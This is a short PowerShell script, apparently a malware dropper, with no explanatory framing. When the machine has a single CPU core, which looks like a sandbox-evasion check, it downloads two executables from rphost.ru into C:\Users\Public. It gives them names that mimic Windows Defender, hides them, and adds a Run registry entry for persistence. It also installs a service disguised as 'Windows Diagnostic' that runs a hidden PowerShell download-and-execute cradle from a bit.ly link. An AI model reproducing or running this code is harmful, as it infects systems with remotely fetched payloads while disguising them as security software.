$n = (Get-WmiObject -class Win32_processor).NumberOfCores
switch ($n)
{
        1 {
		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_1.signed","C:\Users\Public\MSASCuiL.exe")
		Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
                New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2olWimV');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
                start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
		Exit
		} 
        2 
		{
		write-host "Two cores"          
		}
        3 { write-host "Three cores"        }
        4 { write-host "Two cores"          }
  default { write-host "$n cores"           }
}
